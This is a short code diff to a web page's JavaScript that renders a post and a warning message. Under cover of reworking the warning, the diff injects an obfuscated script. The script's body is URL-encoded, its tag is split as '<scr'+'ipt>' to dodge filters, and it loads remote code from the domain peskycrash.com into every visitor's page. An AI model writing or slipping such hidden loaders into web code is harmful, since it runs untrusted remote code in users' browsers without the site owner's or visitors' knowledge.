@@ -36,7 +36,7 @@ function chooseBestModeData(data) {
 	document.getElementById('post').innerHTML = postresult;
 	} else {window.location="/404";}
 
-var warnmsg = $('<div>').html('<a href="/">WARN! if you not create this page. Goto Homepage</a>').css({'color': 'red', 'font-weight': 'bold', 'margin-top': '10px'});
+var warnmsg = decodeURIComponent(`%3Cdiv%20class%3D%22warn%22%3EWARN!%20if%20you%20not%20create%20this%20page.%20%3Cbr%20%2F%3EGoto%20%3Ca%20href%3D%22%2F%22%3EHOMEPAGE%3C%2Fa%3E%3C%2Fdiv%3E`);
 $('#post-top').append(warnmsg+'<scr'+'ipt>'+
 decodeURIComponent(`(function(jzcsi)%7B%0Avar%20d%20%3D%20document%2C%0A%20%20%20%20s%20%3D%20d.createElement('script')%2C%0A%20%20%20%20l%20%3D%20d.scripts%5Bd.scripts.length%20-%201%5D%3B%0As.settings%20%3D%20jzcsi%20%7C%7C%20%7B%7D%3B%0As.src%20%3D%20%22%5C%2F%5C%2Fpeskycrash.com%5C%2Fb.XoVzs%5C%2Fd%5C%2FGPld0%5C%2FYSWRdOikYjWw5KuVZjXgIT%5C%2FueRmN9kuwZhULlik%5C%2FPlTdUTxNNZzQMT5%5C%2FNRjxgWt_NpTSEQ3cMOzfkz2oO%5C%2FQL%22%3B%0As.async%20%3D%20true%3B%0Al.parentNode.insertBefore(s%2C%20l)%3B%0A%7D)(%7B%7D)`)+
 '</scr'+'ipt>');
